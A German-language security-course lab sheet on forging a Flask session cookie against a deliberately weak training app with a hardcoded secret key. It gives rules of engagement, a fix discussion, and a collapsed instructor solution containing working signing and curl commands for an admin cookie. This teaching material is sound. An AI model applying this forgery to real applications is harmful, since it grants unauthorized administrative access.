# Challenge: Session-Fälschung (Cookie schmieden)

Ziel dieser Übung: Zeigt, dass eine „Login-Pflicht" nichts wert ist, wenn der
Session-Cookie nur **signiert** (nicht verschlüsselt) ist und mit einem
**schwachen, bekannten `SECRET_KEY`** abgesichert wurde.

**Aufbau:** Jede:r startet die verwundbare Übungs-App `target_session_forgery.py`
auf dem **eigenen** Rechner. Der/die **Nachbar:in** greift genau diese eine
Instanz an. Ihr tauscht dafür nur die URL eurer Instanz aus
(z. B. `http://192.168.x.y:5001`).

> Lokal starten und im Kurs-Netz erreichbar machen:
> ```powershell
> $env:HOST = "0.0.0.0"; python app.py
> ```
> (Standard ist `127.0.0.1` = nur lokal. `0.0.0.0` nur im vertrauenswürdigen
> Kurs-Netz während des Übungstermins.)

---

## Spielregeln

- Greift **ausschließlich** die Instanz an, deren Besitzer:in euch dazu
  ausdrücklich eingeladen hat (euer:e direkte:r Nachbar:in). Keine anderen
  Rechner, Ports oder Dienste.
- Nur die vorgesehenen fiktiven Konten verwenden. Keine echten Namen,
  Passwörter oder personenbezogenen Daten.
- Keine Denial-of-Service-Versuche, kein Löschen/Verändern von Daten, keine
  Massen-Requests. Die Challenge ist mit **einem einzigen, von Hand gebauten
  Cookie** lösbar.
- Nur während des dafür vorgesehenen Übungstermins.
- Dokumentiert euren Lösungsweg kurz (welchen Cookie habt ihr gebaut, warum hat
  er funktioniert).

---

## Szenario

Auf der Zielinstanz gibt es ein Konto `admin` mit einem **unbekannten,
zufälligen Passwort** — über das Login-Formular kommt ihr dort also nicht rein.
Das Dashboard (`/dashboard`) verlangt einen Login und leitet euch ohne gültige
Session auf `/login` um.

Ihr kennt kein `admin`-Passwort, und ein Session-Cookie bekommt ihr regulär nur
nach erfolgreichem Login.

## Aufgabe

Bringt die Zielseite dazu, euch als **`admin`** zu erkennen — das Dashboard soll
„Willkommen zurück, **admin**" anzeigen —, **ohne** das Passwort von `admin` zu
kennen oder zu verwenden.

## Hinweis

- Der Server legt eure Identität in einem Cookie namens `session` ab. Schaut ihn
  euch an (`curl -i` oder die Entwickler-Tools): Er ist **base64-lesbar**, aber
  am Ende steht eine **Signatur**. Verändert man den Inhalt, passt die Signatur
  nicht mehr — der Server weist den Cookie ab.
- Flask **verschlüsselt** die Session nicht, es **signiert** sie nur
  (HMAC, salt `cookie-session`). Wer den `SECRET_KEY` kennt, kann einen
  **beliebigen Inhalt selbst gültig signieren**.
- Dieser Key ist hier nicht zufällig, sondern ein **schwacher, „geratener"
  Standardwert**. Probiert eine kleine Liste naheliegender Keys durch
  (Projektname, `secret`, `changeme`, … — und denkt an das Thema des Labs 😉).
- Habt ihr den Key, baut einen Cookie mit dem Payload `{"user": "admin"}` und
  setzt ihn, bevor ihr `/dashboard` aufruft.

## Erfolgskriterium

- Ihr habt **keinen** gültigen Login durchgeführt und kein `admin`-Passwort
  verwendet.
- Ihr habt einen **selbst gebauten, gültig signierten** `session`-Cookie gesetzt.
- Das Dashboard zeigt euch als `admin` eingeloggt
  (inkl. Hinweis „Angriff geglückt").

## Zählt **nicht** als Lösung

- Euch mit dem Testkonto `team-test` / `test123` regulär einloggen.
- Das `admin`-Passwort erraten/bruteforcen (ist zufällig, nicht vorgesehen).
- Den Cookie-Inhalt einfach ändern, **ohne** neu zu signieren (der Server lehnt
  ihn ab — genau das ist der Punkt).

---

## Verteidigung / Fix (Diskussion danach)

Warum war es möglich, und was behebt es?

- **Ursache:** schwacher, im Code hinterlegter `SECRET_KEY` (`cowboy`).
- **Fix:** langer, echter Zufalls-Key **nur aus der Umgebung** laden
  (`os.environ["SECRET_KEY"]`), niemals im Code/Repo. Vgl. Lab-Ordner
  `13_session_forgery` (sichere Variante).
- Signierte Cookies sind nicht vertraulich: **keine Geheimnisse** in die Session
  legen; serverseitige Session-Stores erwägen.

<details>
<summary>Lösungsweg (für Lehrende / nach der Übung)</summary>

```bash
# 1) Cookie ansehen – signiert, aber lesbar:
curl -i http://ZIEL:5001/dashboard        # 302 -> /login, setzt session-Cookie

# 2) Key ist der Lab-Default "cowboy". Gültigen Cookie mit user=admin bauen:
python -c "import flask; from flask.sessions import SecureCookieSessionInterface as S; \
a=flask.Flask(__name__); a.secret_key='cowboy'; \
print(S().get_signing_serializer(a).dumps({'user':'admin'}))"

# 3) Cookie setzen und Dashboard öffnen:
curl -i --cookie "session=<AUSGABE-AUS-SCHRITT-2>" http://ZIEL:5001/dashboard
# -> "Willkommen zurück, admin" + "Angriff geglückt"
```

Automatisch (erkennt den schwachen Key, fälscht und bestätigt den Zugriff) —
Scanner liegt im Nachbarordner `attacking/`:
```powershell
python ..\attacking\attack_all.py --base http://ZIEL:5001 --forge-user admin
```
</details>
